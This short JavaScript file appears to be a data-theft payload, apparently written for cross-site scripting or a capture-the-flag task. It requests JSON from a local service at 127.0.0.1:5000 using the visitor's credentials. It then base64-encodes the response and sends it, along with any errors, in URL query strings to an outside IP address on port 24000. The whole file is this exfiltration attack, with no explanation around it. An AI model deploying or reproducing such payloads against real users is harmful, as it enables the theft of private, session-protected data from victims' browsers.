const url = 'http://127.0.0.1:5000';

fetch(url, {
    method: "GET",
    mode: "same-origin",
    cache: "no-cache",
    credentials: "include",
    headers: {
        accept: 'application/json',
      },
    redirect: "follow"
})
  .then(response => {
    return response.json();
  })
  .then(data => {
    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data));
  })
  .catch(error => {
    console.log("error");
    fetch("http://82.65.210.151:24000/?error=" + error);
  });
